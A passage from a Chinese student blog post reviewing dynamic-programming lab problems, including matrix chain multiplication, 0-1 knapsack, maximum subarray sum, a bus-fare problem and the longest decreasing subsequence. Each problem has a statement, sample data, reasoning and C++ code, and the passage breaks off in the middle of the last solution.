<h5 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="number">2</span></span><br><span class="line">A <span class="number">10</span> <span class="number">100</span></span><br><span class="line">B <span class="number">5</span> <span class="number">50</span></span><br><span class="line">C <span class="number">100</span> <span class="number">5</span></span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure>
<h5 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">7500</span></span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure>
<h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>矩阵连乘递归式：<br><img src="/2019/10/28/algorithm-experiment-review/20191025205818292.png" alt="在这里插入图片描述"><br>矩阵连乘的部分不是很复杂，一个函数即可完成，主要的代码量集中在数据的输入和转换上。</p>
<ul>
<li>用结构体Matrix表示矩阵的行和列</li>
<li>再map存储名字和对应的矩阵</li>
<li>将输入的矩阵转换为p数组的同时，判断每相邻的两个矩阵，前一矩阵的行数是否等于后一矩阵的列数，若存在不等的情况，直接输出<code>MengMengda</code>;否则将其列数存入p数组内</li>
</ul>
<h5 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> m[maxn][maxn];</span><br><span class="line"><span class="comment">//用Matrix表示一个矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MatrixLength</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//置对角线为0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        m[i][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//该循环总共n-1次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">2</span>; r &lt;= n; r++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//n-r+1表示每一斜列的个数，i表示行号</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - r + <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = r - <span class="number">1</span> + i;</span><br><span class="line">            <span class="comment">//在第一个矩阵后面加断点</span></span><br><span class="line">            m[i][j] = m[i + <span class="number">1</span>][j] + p[i - <span class="number">1</span>] * p[i] * p[j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i + <span class="number">1</span>; k &lt; j; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//每次将断点的位置向后移位一次，并更新</span></span><br><span class="line">                <span class="keyword">int</span> t = m[i][k] + m[k + <span class="number">1</span>][j] + p[i - <span class="number">1</span>] * p[k] * p[j];</span><br><span class="line">                <span class="keyword">if</span> (t &lt; m[i][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    m[i][j] = t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m[<span class="number">1</span>][n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, l;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">char</span>, Matrix&gt; matrix;</span><br><span class="line">        <span class="keyword">while</span>(n--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> name;</span><br><span class="line">            <span class="keyword">int</span> row, col;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; name &gt;&gt; row &gt;&gt; col;</span><br><span class="line">            Matrix temp;</span><br><span class="line">            temp.r = row;</span><br><span class="line">            temp.c = col;</span><br><span class="line">            matrix[name] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> Multi;</span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line">        <span class="keyword">while</span>(l--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Multi;</span><br><span class="line">            <span class="keyword">int</span> len = Multi.length();</span><br><span class="line">            <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">            p[<span class="number">0</span>] = matrix[Multi[<span class="number">0</span>]].r;</span><br><span class="line">            p[<span class="number">1</span>] = matrix[Multi[<span class="number">0</span>]].c;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; len;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[Multi[j<span class="number">-1</span>]].c!=matrix[Multi[j]].r)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                p[j + <span class="number">1</span>] = matrix[Multi[j]].c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"MengMengDa"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                MatrixLength(p, len);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h3><h5 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h5><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p>
<h5 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p>
<p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p>
<h5 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h5><p>对每组测试数据，输出其对应的所装物品的最大价值。</p>
<h5 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="symbol">10 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">6</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p><code>m(i,j)</code>表示背包容量为<code>j</code>，可选物品为<code>i,i+1,...,n</code>时的最优解。<br><img src="/2019/10/28/algorithm-experiment-review/20191026112843341.png" alt="在这里插入图片描述"><br>这一题不知道为什么用cin\cout就会报错，用<code>scanf</code>和<code>printf</code>则正确…</p>
<h5 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line">ll m[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    ll c, w[maxn], v[maxn];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line">    <span class="comment">//cin &gt;&gt; t;</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld %d"</span>, &amp;c, &amp;n);</span><br><span class="line">        <span class="comment">//cin &gt;&gt; c &gt;&gt; n;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld %lld"</span>, &amp;w[i], &amp;v[i]);</span><br><span class="line">            <span class="comment">//cin &gt;&gt; w[i] &gt;&gt; v[i];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i,j,jMax = min(w[n] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            m[n][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">            m[n][j] = v[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            jMax = min(w[i] - <span class="number">1</span>, c);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">                m[i][j] = m[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">                m[i][j] = max(m[i + <span class="number">1</span>][j], m[i + <span class="number">1</span>][j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        m[<span class="number">1</span>][c] = m[<span class="number">2</span>][c];</span><br><span class="line">        <span class="keyword">if</span> (c &gt;= w[<span class="number">1</span>])</span><br><span class="line">            m[<span class="number">1</span>][c] = max(m[<span class="number">1</span>][c], m[<span class="number">2</span>][c - w[<span class="number">1</span>]] + v[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, m[<span class="number">1</span>][c]);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; m[1][c] &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h3><h5 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p>
<h5 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p>
<p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p>
<p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p>
<h5 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h5><p>输出其对应的最大子段和。</p>
<h5 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="symbol">2 </span>-<span class="number">11</span> <span class="number">4</span> <span class="number">13</span> -<span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure>
<h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><p>子段可为空集，答案为0</p>
<h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p><img src="/2019/10/28/algorithm-experiment-review/20191026151635622.png" alt="在这里插入图片描述"><br>递归方程如下，<code>b[j]</code>表示1到j的最大字段和：<br><img src="/2019/10/28/algorithm-experiment-review/20191026151717337.png" alt="在这里插入图片描述"></p>
<h5 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[i<span class="number">-1</span>]&gt;<span class="number">0</span>)</span><br><span class="line">                b[i] = b[i - <span class="number">1</span>] + a[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                b[i] = a[i];</span><br><span class="line">            sum = max(sum, b[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<h3 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h3><h5 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h5><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p>
<h5 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h5><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p>
<h5 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h5><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p>
<h5 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">56 </span><span class="number">4</span></span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">21</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">56</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>重量和价值相等的0-1背包问题。</p>
<h5 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">55</span>][<span class="number">45005</span>];</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">55</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> jMax = min(w[n] - <span class="number">1</span>, c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">        dp[n][j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">        dp[n][j] = w[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        jMax = min(w[i] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">            dp[i][j] = max(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j - w[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">1</span>][c] = dp[<span class="number">2</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= dp[<span class="number">1</span>][c])</span><br><span class="line">        dp[<span class="number">1</span>][c] = max(dp[<span class="number">1</span>][c], dp[<span class="number">2</span>][c - w[<span class="number">1</span>]] + w[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[<span class="number">1</span>][c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<h3 id="汽车费用"><a href="#汽车费用" class="headerlink" title="汽车费用"></a>汽车费用</h3><h5 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h5><p>一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。</p>
<h5 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h5><p>第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。</p>
<h5 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h5><p>仅一个整数表示最少费用。</p>
<h5 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span> <span class="number">21</span> <span class="number">31</span> <span class="number">40</span> <span class="number">49</span> <span class="number">58</span> <span class="number">69</span> <span class="number">79</span> <span class="number">90</span> <span class="number">101</span></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">147</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>动态规划，依次计算出行走<code>i</code>公里需要的最少费用。</p>
<p>计算行走<code>i</code>公里最少费用时，用<code>j</code>遍历<code>[1~i-1]</code>，依次比较<code>price[i]</code>和<code>price[j]+price[i-j]</code>的值，遍历完成后，<code>price[i]</code>为最少费用。</p>
<p>例如，<code>price[4] = min(price[4], price[1]+price[3], price[2]+price[2], price[3]+price[1])</code></p>
<h5 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> price[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> dist;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; price[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; dist;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">11</span>; i &lt;= dist; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		price[i] = inf;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= dist; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			price[i] = min(price[i], price[j] + price[i - j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; price[dist] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h3><h5 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p>
<h5 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h5><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p>
<h5 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h5><p>输出最长递减子序列，数字之间有一个空格。</p>
<h5 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="symbol">9 </span><span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">9 </span><span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p><code>dp[i]</code>存储<code>[i~n]</code>区间的最长递减子序列，双重循环从后向前遍历，内层循环从<code>[i+1~n]</code>，找出最大值小于<code>i</code>的最长递减子序列的长度；外层循环从[<code>n-2~0]</code>，将内层循环找到的最大值加一，更新所有的<code>dp[i]</code>。</p>
<p>输出最优解时，因为刚才是从后向前遍历的,所以所有最大递增子序列均在<code>maxpos</code>之后。遍历<code>[maxpos~n]</code>，寻找最大递减子序列的下一元素时，只需要判断其值是否小于上一元素且它的最大递减子序列是否比上一元素的小1，即可。</p>
<h5 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="comment">//dp[i]存储[i~end]区间的最长递减子序列</span></span><br><span class="line"><span class="keyword">int</span> dp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, maxval = <span class="number">1</span>, maxpos = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>; <span class="comment">//保存从[i+1~end]区间内的最长递减子序列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//找出[i+1~end]区间中最大值比i小的最长递减子序列</span></span><br><span class="line">            <span class="keyword">if</span> (a[i] &gt; a[j])</span><br><span class="line">            &#123;</span><br><span class="line">                max = dp[j] &gt; max ? dp[j] : max;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//i的最长递减子序列=[i+1~end]区间的最长递减子序列+1</span></span><br><span class="line">        dp[i] = max + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] &gt; maxval)</span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="comment">//存储最优值</span></span><br><span class="line">            maxval = dp[i];</span><br><span class="line">            